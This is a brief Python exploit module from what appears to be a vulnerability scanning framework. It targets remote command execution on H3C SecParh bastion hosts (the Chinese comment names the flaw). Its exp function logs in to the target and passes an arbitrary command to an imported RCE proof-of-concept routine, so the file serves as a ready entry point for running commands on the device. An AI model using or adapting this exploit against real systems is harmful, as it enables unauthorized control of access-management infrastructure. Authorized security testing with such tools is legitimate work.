# -*- coding:utf-8 -*-
# H3C SecParh堡垒机远程命令执行
import requests

from VulnScanModel.models import VulnScan
from . import h3c_secparth_rce_poc


def exp(vuln: VulnScan, cmd, content=""):
    session = requests.session()
    h3c_secparth_rce_poc.login(vuln.url, session)
    return h3c_secparth_rce_poc.rce(vuln.url, session, cmd)
